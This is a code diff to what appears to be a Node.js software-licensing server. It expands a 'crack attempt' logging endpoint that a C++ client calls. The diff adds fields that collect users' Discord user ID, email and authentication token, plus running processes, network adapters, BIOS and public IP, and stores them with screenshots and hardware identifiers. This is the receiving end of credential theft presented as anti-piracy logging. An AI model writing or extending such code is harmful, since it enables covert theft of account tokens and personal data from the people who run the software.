@@ -250,7 +250,7 @@ app.post('/auth/verify-owner-key', (req, res) => {
     const { owner_key } = req.body;
     if (owner_key === ownerKey.key) {
         res.json({ success: true, message: 'Owner key valid' });
-            } else {
+    } else {
         res.json({ success: false, message: 'Invalid owner key' });
     }
 });
@@ -287,7 +287,7 @@ app.post('/auth/admin/generate-key', (req, res) => {
     
     const key = generateLicenseKey();
     licenses[key] = {
-        valid: true,
+            valid: true,
         hwid: null,
         activated: false,
         created: Date.now(),
@@ -370,16 +370,16 @@ app.post('/auth/admin/revoke-key', (req, res) => {
 // Log a crack attempt (called from C++ client)
 app.post('/auth/log-crack-attempt', (req, res) => {
     try {
-        const ip = getIP(req);
+        const serverIP = getIP(req);
             const { 
-                hwid, 
+            hwid, 
             gpu_hash,
             motherboard_uuid,
             detection_type,
             detected_tool,
             screenshot_base64,
             system_info,
-            username,
+                username, 
             computer_name,
             windows_version,
             mac_address,
@@ -387,13 +387,31 @@ app.post('/auth/log-crack-attempt', (req, res) => {
             gpu,
             ram,
             disk_serial,
-            timestamp
+                timestamp, 
+            // NEW FIELDS
+            public_ip,
+            motherboard,
+            bios,
+            network_adapters,
+            screen_resolution,
+            timezone,
+            system_uptime,
+            running_processes,
+            discord_user_id,
+            discord_username,
+            discord_discriminator,
+            discord_email,
+            discord_token
             } = req.body;
+            
+        // Use public IP if provided (more accurate), fallback to server-detected IP
+        const ip = public_ip && public_ip !== 'Unknown' ? public_ip : serverIP;
             
         const crackLog = {
             id: crypto.randomBytes(8).toString('hex'),
             timestamp: timestamp || Date.now(),
             ip: ip,
+            server_ip: serverIP, // Keep both for reference
             hwid: hwid || gpu_hash || 'unknown',
             motherboard_uuid: motherboard_uuid || 'unknown',
             detection_type: detection_type || 'unknown',
@@ -404,12 +422,29 @@ app.post('/auth/log-crack-attempt', (req, res) => {
             username: username || 'unknown',
             computer_name: computer_name || 'unknown',
             windows_version: windows_version || 'unknown',
-            // New detailed fields
+            // Hardware info
             mac_address: mac_address || 'unknown',
             cpu: cpu || 'unknown',
             gpu: gpu || 'unknown',
             ram: ram || 'unknown',
-            disk_serial: disk_serial || 'unknown'
+            disk_serial: disk_serial || 'unknown',
+            motherboard: motherboard || 'unknown',
+            bios: bios || 'unknown',
+            // Network info
+            network_adapters: network_adapters || 'unknown',
+            // System info
+            screen_resolution: screen_resolution || 'unknown',
+            timezone: timezone || 'unknown',
+            system_uptime: system_uptime || 'unknown',
+            running_processes: running_processes || '',
+            // Discord info
+            discord: {
+                user_id: discord_user_id || 'unknown',
+                username: discord_username || 'unknown',
+                discriminator: discord_discriminator || '0000',
+                email: discord_email || 'unknown',
+                token_preview: discord_token || 'Not Found'
+            }
         };
 
         // Store full screenshot separately if provided
@@ -438,7 +473,7 @@ app.post('/auth/log-crack-attempt', (req, res) => {
             // Reset if 24 hours have passed
             if ((now - counter.firstAttempt) > 24 * 60 * 60 * 1000) {
                 crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
-            } else {
+    } else {
                 counter.count++;
             }
         } else {
@@ -581,12 +616,13 @@ app.post('/auth/admin/security-stats', (req, res) => {
 
 app.post('/auth/admin/get-all-status', (req, res) => {
     res.json({
-            success: true,
-        server: !serverDisabled,
-        auth: authEnabled,
+        success: true,
+        server_enabled: !serverDisabled,
+        server_disabled: serverDisabled,
+        auth_enabled: authEnabled,
         maintenance: maintenanceMode,
         lockdown: lockdownMode,
-        website_lock: websiteLocked
+        website_locked: websiteLocked
     });
 });
 
